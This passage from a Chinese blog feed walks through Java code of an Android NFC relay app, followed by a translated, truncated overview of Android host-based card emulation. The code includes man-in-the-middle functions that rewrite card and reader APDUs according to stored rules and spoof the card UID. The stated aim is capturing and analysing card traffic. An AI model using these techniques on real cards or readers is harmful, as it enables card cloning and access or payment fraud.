class="keyword">while</span> (c.moveToNext());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> map;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="sessionloggingdbhelper">3. SessionLoggingDbHelper</h4><p>这个类存储卡和读卡器的apdu数据.</p><h3 id="filter">Ⅱ. filter</h3><p>这里是过滤一些不规范的apdu数据, 下面只分析部分<code>FilterManager</code>:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">true<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute filters that are registered for HCE data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nfcdata The APDU that should be filtered</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The filtered HCE data</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> NfcComm <span class="title">filterHCEData</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里根据RuleListStorage的规则识别一些来自读卡器的apdu指令，以便对其做进一步操作</span></span><br><span class="line">    rule.changeHCEData(nfcdata);</span><br><span class="line">    <span class="keyword">if</span> (mHCENonEmpty) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nfcdata.getType() != NfcComm.Type.NFCBytes) <span class="keyword">return</span> nfcdata;</span><br><span class="line">        <span class="keyword">for</span> (Filter f : mHCEFilters) &#123;</span><br><span class="line">            nfcdata = f.filter(nfcdata);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nfcdata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">true<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute filters that are registered for Card data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> nfcdata The APDU that should be filtered</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> The filtered Card data</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> NfcComm <span class="title">filterCardData</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 这里根据上面识别的来自读卡器的apdu指令，对卡返回的数据进行修改</span></span><br><span class="line">    rule.changeCardData(nfcdata);</span><br><span class="line">    <span class="keyword">if</span> (mCardNonEmpty) &#123;</span><br><span class="line">        <span class="keyword">if</span> (nfcdata.getType() != NfcComm.Type.NFCBytes) <span class="keyword">return</span> nfcdata;</span><br><span class="line">        <span class="keyword">for</span> (Filter f : mCardFilters) &#123;</span><br><span class="line">            nfcdata = f.filter(nfcdata);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nfcdata;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">true<span class="comment">/**</span></span><br><span class="line"><span class="comment">     * Execute filters that are registered for Anticollision data</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> anticol NfcComm object containing anticol data</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> NfcComm <span class="title">filterAnticolData</span><span class="params">(NfcComm anticol)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 修改UID也是在这里开始的</span></span><br><span class="line">    anticol = rule.changeAnticolData(anticol);</span><br><span class="line">    <span class="keyword">if</span> (mAnticolNonEmpty) &#123;</span><br><span class="line">        <span class="keyword">if</span> (anticol.getType() != NfcComm.Type.AnticolBytes) <span class="keyword">return</span> anticol;</span><br><span class="line">        <span class="keyword">for</span> (Filter f : mAnticolFilters) &#123;</span><br><span class="line">            anticol = f.filter(anticol);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> anticol;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="其他">Ⅲ. 其他</h3><h4 id="customtextwatcher">1. CustomTextWatcher</h4><p><code>TextWatcher</code>有三个重要的方法, 顾名思义分别是TextView在改变前/改变时/改变后的动作:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在改变前没有做任何修改</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">beforeTextChanged</span><span class="params">(CharSequence charSequence, <span class="keyword">int</span> start,</span></span></span><br><span class="line"><span class="function"><span class="params">                              <span class="keyword">int</span> count, <span class="keyword">int</span> after)</span> </span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 这里限定了输入时只能输入16进制字符, 而且每两个字符之间像个一个空格</span></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onTextChanged</span><span class="params">(CharSequence charSequence, <span class="keyword">int</span> start, <span class="keyword">int</span> before,</span></span></span><br><span class="line"><span class="function"><span class="params">                          <span class="keyword">int</span> count)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        String temp = charSequence.toString();</span><br><span class="line">        <span class="comment">// Set selection.</span></span><br><span class="line">        <span class="keyword">if</span> (mLastText.equals(temp)) &#123;</span><br><span class="line">            <span class="keyword">if</span> (mInvalid) &#123;</span><br><span class="line">                mSelection -= <span class="number">1</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">if</span> ((mSelection &gt;= <span class="number">1</span>) &amp;&amp; (temp.length() &gt; mSelection - <span class="number">1</span>)</span><br><span class="line">                    &amp;&amp; (temp.charAt(mSelection - <span class="number">1</span>)) == <span class="string">' '</span>) &#123;</span><br><span class="line">                    mSelection += <span class="number">1</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">int</span> length = mLastText.length();</span><br><span class="line">            <span class="keyword">if</span> (mSelection &gt; length) &#123;</span><br><span class="line"></span><br><span class="line">                mEditText.setSelection(length);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line"></span><br><span class="line">                mEditText.setSelection(mSelection);</span><br><span class="line">            &#125;</span><br><span class="line">            mFormat = <span class="keyword">false</span>;</span><br><span class="line">            mInvalid = <span class="keyword">false</span>;</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        mFormat = <span class="keyword">true</span>;</span><br><span class="line">        mSelection = start;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Delete operation.</span></span><br><span class="line">        <span class="keyword">if</span> (count == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> ((mSelection &gt;= <span class="number">1</span>) &amp;&amp; (temp.length() &gt; mSelection - <span class="number">1</span>)</span><br><span class="line">                &amp;&amp; (temp.charAt(mSelection - <span class="number">1</span>)) == <span class="string">' '</span>) &#123;</span><br><span class="line">                mSelection -= <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Input operation.</span></span><br><span class="line">        mSelection += count;</span><br><span class="line">        <span class="keyword">char</span>[] lastChar = (temp.substring(start, start + count))</span><br><span class="line">            .toCharArray();</span><br><span class="line">        <span class="keyword">int</span> mid = lastChar[<span class="number">0</span>];</span><br><span class="line">        <span class="keyword">if</span> (mid &gt;= <span class="number">48</span> &amp;&amp; mid &lt;= <span class="number">57</span>) &#123;</span><br><span class="line">            <span class="comment">/* 1-9. */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mid &gt;= <span class="number">65</span> &amp;&amp; mid &lt;= <span class="number">70</span>) &#123;</span><br><span class="line">            <span class="comment">/* A-F. */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (mid &gt;= <span class="number">97</span> &amp;&amp; mid &lt;= <span class="number">102</span>) &#123;</span><br><span class="line">            <span class="comment">/* a-f. */</span></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">/* Invalid input. */</span></span><br><span class="line">            mInvalid = <span class="keyword">true</span>;</span><br><span class="line">            temp = temp.substring(<span class="number">0</span>, start)</span><br><span class="line">                + temp.substring(start + count, temp.length());</span><br><span class="line">            mEditText.setText(temp);</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.i(TAG, e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">afterTextChanged</span><span class="params">(Editable editable)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">/* Format input. */</span></span><br><span class="line">        <span class="keyword">if</span> (mFormat) &#123;</span><br><span class="line">            StringBuilder text = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            <span class="comment">// 这里将空格删去</span></span><br><span class="line">            text.append(editable.toString().replace(<span class="string">" "</span>, <span class="string">""</span>));</span><br><span class="line">            <span class="keyword">int</span> length = text.length();</span><br><span class="line">            <span class="keyword">int</span> sum = (length % <span class="number">2</span> == <span class="number">0</span>) ? (length / <span class="number">2</span>) - <span class="number">1</span> : (length / <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> offset = <span class="number">2</span>, index = <span class="number">0</span>; index &lt; sum; offset += <span class="number">3</span>, index++) &#123;</span><br><span class="line">                text.insert(offset, <span class="string">" "</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            mLastText = text.toString();</span><br><span class="line">            mEditText.setText(text);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        Log.i(TAG, e.toString());</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="nfccomm">2. NfcComm</h4><p>这个类定义了nfc apdu数据的多种数据类型.</p><h4 id="rulematching">3. RuleMatching</h4><ol type="1"><li><p>下示代码时修改UID的一个函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">changeUIDRule</span><span class="params">(NfcComm anticol)</span></span>&#123;</span><br><span class="line">    String UID = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">if</span> (ac.equals(MitMAction.RandomAnticol)) &#123;</span><br><span class="line">        <span class="comment">// 随机生成4字节的数据作为UID</span></span><br><span class="line">        UID = Utils.randomHexString(<span class="number">4</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ac.equals(MitMAction.SelfDefineAnticol)) &#123;</span><br><span class="line">        UID = mUID;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (UID != <span class="keyword">null</span>) &#123;</span><br><span class="line">        mConfig = Utils.relaceBytesFromArray(anticol.getConfig().build(),</span><br><span class="line">                                             Utils.toBytes(UID),</span><br><span class="line">                                             <span class="keyword">new</span> <span class="keyword">byte</span>[]&#123;(<span class="keyword">byte</span>)<span class="number">0x33</span>,</span><br><span class="line">                                                        (<span class="keyword">byte</span>)<span class="number">0x04</span>&#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>以下是识别来自card的指令的函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">compReaderCommFromDb</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    RuleListStorage db = <span class="keyword">new</span> RuleListStorage(RelayFragment.getInstance().getContext());</span><br><span class="line">    List&lt;RuleListItem&gt; items = db.getAll();</span><br><span class="line">    <span class="comment">// 遍历每个位于规则数据库的item</span></span><br><span class="line">    <span class="keyword">for</span> (RuleListItem item: items) &#123;</span><br><span class="line">        <span class="comment">// 如果当前的item的state为1, 则将mChangeCardComm赋值</span></span><br><span class="line">        <span class="keyword">if</span> (item.getSelect() == <span class="number">1</span>) &#123;</span><br><span class="line">            <span class="keyword">if</span> (Utils.bytesToHex(nfcdata.getData()).indexOf(</span><br><span class="line">                Utils.bytesToHex(item.getReaderComm().getData())) == <span class="number">0</span>) &#123;</span><br><span class="line">                mChangeCardComm = item.getCardComm().getData();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mChangeCardComm = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span> <span class="keyword">if</span> (item.getSelect() == <span class="number">2</span>) &#123;</span><br><span class="line">            <span class="comment">// 通过读卡器的数据来修改读卡器命令</span></span><br><span class="line">            <span class="keyword">if</span> (Utils.bytesToHex(nfcdata.getData()).indexOf(</span><br><span class="line">                Utils.bytesToHex(item.getReaderComm().getData())) == <span class="number">0</span>) &#123;</span><br><span class="line">                mChangeHceComm = item.getCardComm().getData();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                mChangeHceComm = <span class="keyword">null</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>以下三个函数时中间人apdu数据重要函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 修改card返回的apdu数据</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> NfcComm <span class="title">changeCardData</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//        Log.i(TAG,"Card: " + Utils.bytesToHex(nfcdata.getData()));</span></span><br><span class="line">    <span class="keyword">if</span> (mChangeCardComm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="comment">//            Log.i(TAG,"Exec: " + Utils.bytesToHex(mChangeCardComm));</span></span><br><span class="line">        nfcdata.setData(mChangeCardComm);</span><br><span class="line">        mChangeCardComm = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nfcdata;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改读卡器发送的apdu数据</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> NfcComm <span class="title">changeHCEData</span><span class="params">(NfcComm nfcdata)</span> </span>&#123;</span><br><span class="line">    <span class="comment">//        Log.i(TAG,"HCE : " + Utils.bytesToHex(nfcdata.getData()));</span></span><br><span class="line">    compReaderCommFromDb(nfcdata);</span><br><span class="line">    <span class="keyword">if</span> (mChangeHceComm != <span class="keyword">null</span>) &#123;</span><br><span class="line">        nfcdata.setData(mChangeHceComm);</span><br><span class="line">        mChangeHceComm = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> nfcdata;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 修改uid</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> NfcComm <span class="title">changeAnticolData</span><span class="params">(NfcComm anticol)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (anticol.getType() == NfcComm.Type.AnticolBytes) &#123;</span><br><span class="line">        changeUIDRule(anticol);</span><br><span class="line">        <span class="keyword">if</span> (mConfig != <span class="keyword">null</span>) &#123;</span><br><span class="line">            anticol = <span class="keyword">new</span> NfcComm(<span class="keyword">new</span> ConfigBuilder(mConfig));</span><br><span class="line">            mConfig = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> anticol;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h4 id="utils">4. Utils</h4><p>这个类含有全局需要的处理数据的函数. 大部分已注释了解释的函数不在列举. 举一个简单的函数:</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 这个函数读取特定目录下的所有文件, 并返回文件名列表</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> ArrayList&lt;String&gt; <span class="title">listDir</span><span class="params">(String path)</span></span>&#123;</span><br><span class="line">    ArrayList&lt;String&gt; myFile = <span class="keyword">new</span> ArrayList&lt;String&gt;();</span><br><span class="line">    String realPath=Environment.getExternalStorageDirectory().toString()+<span class="string">"/MTYReader/"</span>+path;</span><br><span class="line">    Log.i(<span class="string">"listDir"</span>,realPath);</span><br><span class="line">    File file=<span class="keyword">new</span> File(realPath);</span><br><span class="line">    File[] files=file.listFiles();</span><br><span class="line">    <span class="keyword">if</span> (files == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i =<span class="number">0</span>;i&lt;files.length;i++)&#123;</span><br><span class="line">        myFile.add(files[i].getName());</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> myFile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;x00-概述&quot;&gt;0x00 概述&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;在正式开始介绍项目前，我想先介绍一下背景及一些废话，方便大家能够更好理解这个项目。这个项目起初是为了能够更好地抓取手机与IC卡之间的交互数据，以及对抓取的数据进行分析。&lt;/p&gt;&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Android Developer" scheme="http://www.killshadow.xyz/tags/Android-Developer/"/>
    
  </entry>
  
  <entry>
    <title>基于主机的卡模拟(HCE)概述</title>
    <link href="http://www.killshadow.xyz/2018/06/15/%E5%9F%BA%E4%BA%8E%E4%B8%BB%E6%9C%BA%E7%9A%84%E5%8D%A1%E6%A8%A1%E6%8B%9F(HCE)%E6%A6%82%E8%BF%B0/"/>
    <id>http://www.killshadow.xyz/2018/06/15/基于主机的卡模拟(HCE)概述/</id>
    <published>2018-06-14T17:23:33.334Z</published>
    <updated>2018-06-15T01:48:44.397Z</updated>
    
    <content type="html"><![CDATA[<h2 id="x00-概述">0x00 概述</h2><p>许多提供NFC功能的基于Android的设备已经支持NFC卡模拟。在大多数情况下，该卡由设备中的单独芯片模拟，称为<em>安全元件(Secure Element)</em>。无线运营商提供的许多SIM卡还包含安全元件(Secure Element)。 <a id="more"></a> Android 4.4引入了另一种卡模拟方法，它不涉及SE，称为<em>基于主机的卡模拟</em>。这允许任何Android应用程序模拟卡并直接与NFC读卡器通话。本文档描述了基于主机的卡仿真（HCE）如何在Android上工作，以及如何使用此技术开发模拟NFC卡的应用程序。</p><h2 id="x01-卡仿真与se">0x01 卡仿真与SE</h2><p>当使用安全元件(Secure Element)提供NFC卡模拟时，将通过Android应用程序将要模拟的卡提供到设备上的安全元件(Secure Element)中。然后，当用户通过NFC终端握住设备时，设备中的NFC控制器将来自读卡器(NFC Reader)的所有数据直接路由到安全元件(Secure Element)。图1说明了这个概念。</p><center><img src="https://github.com/killshadow/killshadow.github.io/blob/master/image/002/1.png?raw=true" title="fig:" alt="图1.带有安全元件的NFC卡仿真"></center><p>安全元件(Secure Element)本身执行与NFC终端的通信，并且完全不涉及Android应用。交易完成后，Android应用程序可以直接查询SE的交易状态并通知用户。</p><h2 id="x02-基于主机的卡模拟">0x02 基于主机的卡模拟</h2><p>当使用基于主机的卡仿真来仿真NFC卡时，数据将被路由到直接运行Android应用程序的主机CPU，而不是将NFC协议帧路由到SE。图2展示了基于主机的卡仿真如何工作。</p><center><img src="https://github.com/killshadow/killshadow.github.io/blob/master/image/002/2.png?raw=true" title="fig:" alt="图2.基于主机的卡仿真模式"></center><h2 id="x03-支持的nfc卡和协议">0x03 支持的NFC卡和协议</h2><p>NFC标准提供对许多不同协议的支持，并且可以模拟不同类型的卡。</p><p>Android 4.4支持当今市场上常见的几种协议。许多现有的非接触式卡已经基于这些协议，例如非接触式支付卡。这些协议也得到了当今市场上众多NFC读卡器的支持，其中包括Android NFC设备可以自己作为读卡器（请参见<a href="https://developer.android.com/reference/android/nfc/tech/IsoDep.html" target="_blank" rel="noopener">IsoDep</a>课程）。这使您可以仅使用基于Android的设备在HCE周围构建和部署端到端NFC解决方案。</p><p>具体而言，Android 4.4支持基于NFC-Forum ISO-DEP规范（基于ISO / IEC 14443-4）的仿真卡，并处理ISO / IEC 7816-4规范中定义的应用协议数据单元（APDU）。Android只强制在Nfc-A（ISO / IEC 14443-3 Type A）技术之上模拟ISO-DEP。支持Nfc-B（ISO / IEC 14443-4 Type B）技术是可选的。所有这些规格的分层如图3所示。</p><center><img src="https://github.com/killshadow/killshadow.github.io/blob/master/image/002/3.png?raw=true" title="fig:" alt="图3.Android的HCE协议栈"></center><h2 id="x04-hce服务">0x04 HCE服务</h2><p>Android中的HCE体系结构基于Android <a href="https://developer.android.com/reference/android/app/Service.html" target="_blank" rel="noopener">Service</a>组件（称为“HCE服务”）。服务的一个关键优势是它可以在没有任何用户界面的情况下在后台运行。这对于许多HCE应用程序来说非常合适，例如会员卡或公交卡，用户不需要启动应用程序即可使用它。相反，通过NFC读卡器轻敲设备将启动正确的服务（如果尚未运行）并在后台执行该事务。当然，如果有意义的话，您可以自由地从您的服务中启动额外的UI（例如用户通知）。</p><h3 id="服务选择">4.1 服务选择</h3><p>当用户将设备连接到NFC读取器时，Android系统需要知道NFC读取器实际想要与哪个HCE服务通话。这就是ISO / IEC 7816-4规范的出处：它定义了一种选择应用程序的方式，以应用程序ID（AID）为中心。一个AID最多由16个字节组成。如果您正在模拟现有NFC读卡器基础架构的卡片，那么这些读卡器所寻找的AID通常是众所周知的并且是公开注册的（例如Visa和MasterCard等支付网络的AID）。</p><p>如果您想为自己的应用程序部署新的读卡器基础结构，则需要注册您自己的AID。AID的注册程序在ISO / IEC 7816-5规范中定义。如果您要为Android部署HCE应用程序，Google建议按照7816-5注册AID，因为它可以避免与其他应用程序发生冲突。</p><h3 id="aid组">4.2 AID组</h3><p>在某些情况下，HCE服务可能需要注册多个AID才能实现某个应用程序，并且需要确保它是所有这些AID的默认处理程序（而不是组中的某些AID转到其他服务） 。</p><p>一个AID组是应该被OS视为一起归属的AID列表。对于AID组中的所有AID，Android会保证以下其中一项：</p><ul><li>组中的所有AID都路由到此HCE服务</li><li>该组中的任何AID都不会路由到此HCE服务（例如，因为用户更喜欢另一个在您的组中也请求一个或多个AID的服务）</li></ul><p>换句话说，没有中间状态，组中的一些AID可以路由到一个HCE服务，另一些AID可路由到另一个。</p><h3 id="aid组和类别">4.3 AID组和类别</h3><p>每个AID组都可以与一个类别关联。这允许Android按类别将HCE服务组合在一起，并且反过来又允许用户在类别的级别而不是AID级别设置默认值。通常，避免在应用程序的任何面向用户的部分提及AID：它们对普通用户没有任何意义。</p><p>Android 4.4支持两种类别: <a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT" target="_blank" rel="noopener">CATEGORY_PAYMENT</a>（涵盖行业标准支付应用程序）和<a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER" target="_blank" rel="noopener">CATEGORY_OTHER</a>（对于所有其他HCE应用程序）。</p><blockquote><p><strong>注意：</strong><a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_PAYMENT" target="_blank" rel="noopener">CATEGORY_PAYMENT</a>在任何给定时间，只能在系统中启用该类别中的一个AID组。通常，这将是一款了解主要信用卡付款协议并可以在任何商家工作的应用程序。</p><p>对于仅适用于一个商家（如储值卡）<em>的闭环</em>支付应用程序，您应该使用<a href="https://developer.android.com/reference/android/nfc/cardemulation/CardEmulation.html#CATEGORY_OTHER" target="_blank" rel="noopener">CATEGORY_OTHER</a>。此类别中的AID组可以始终处于活动状态，并且在需要时可以在AID选择期间由NFC读卡器给予优先权。</p></blockquote><h2 id="x05-实施hce服务">0x05 实施HCE服务</h2><p>要使用基于主机的卡仿真来模拟NFC卡，您需要创建一个<a href="https://developer.android.com/reference/android/app/Service.html" target="_blank" rel="noopener">Service</a>处理NFC事务的组件。</p><h3 id="检查hce支持">5.1 检查HCE支持</h3><p>您的应用程序可以通过检查<a 